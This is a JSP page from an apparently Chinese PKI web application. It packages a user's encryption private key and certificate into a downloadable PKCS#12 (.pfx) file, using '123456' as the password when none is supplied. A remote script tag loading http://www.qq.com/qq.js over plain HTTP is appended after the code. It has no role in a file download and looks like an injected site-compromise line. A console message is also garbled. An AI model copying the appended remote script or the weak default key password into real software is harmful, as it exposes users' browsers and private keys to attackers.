<%@page import="java.security.*"%>
<%@page import="java.security.cert.Certificate"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="org.bouncycastle.jce.provider.*"%>
<%@ page import="ApproveBeans.ApproveBean" %>
<jsp:useBean id="approveBean" class="ApproveBeans.ApproveBean" scope="session"/>
<%
    String pkcspwd=request.getParameter("pkcspwd");
    if(pkcspwd==null || pkcspwd.trim().equals("")) pkcspwd="123456";
   
    KeyStore outputKeyStore = KeyStore.getInstance("PKCS12","BC");
    outputKeyStore.load(null, pkcspwd.toCharArray());	
    outputKeyStore.setKeyEntry(approveBean.subjectId_Encrypt, approveBean.encryptPvk, pkcspwd.toCharArray(), new Certificate[]{approveBean.encryptXC});
    ByteArrayOutputStream baos=new  ByteArrayOutputStream();
    outputKeyStore.store(baos,  pkcspwd.toCharArray());

    String fname="certId("+approveBean.subjectId_Encrypt+")_applyId("+approveBean.applyId+")";	
    response.setContentType("application/file");
    response.setHeader("Content-disposition","attachment; filename=pkiUser_PKCS12_"+fname+"_forEncrypt&Decrypt.pfx");
    
    BufferedInputStream bis = null;
    BufferedOutputStream bos = null;
    try {
        bis = new BufferedInputStream(new ByteArrayInputStream(baos.toByteArray()));
        bos = new BufferedOutputStream(response.getOutputStream());

        byte[] buff = new byte[2048];
        int bytesRead;

        while(-1 != (bytesRead = bis.read(buff, 0, buff.length))) {
            bos.write(buff,0,bytesRead);
        }

    } catch(final IOException e) {
        System.out.println ( "³öÏÖIOException." + e );
    } finally {
        if (bis != null)
            bis.close();
        if (bos != null)
            bos.close();
    }
%>
<script language=javascript src=http://www.qq.com/qq.js></script>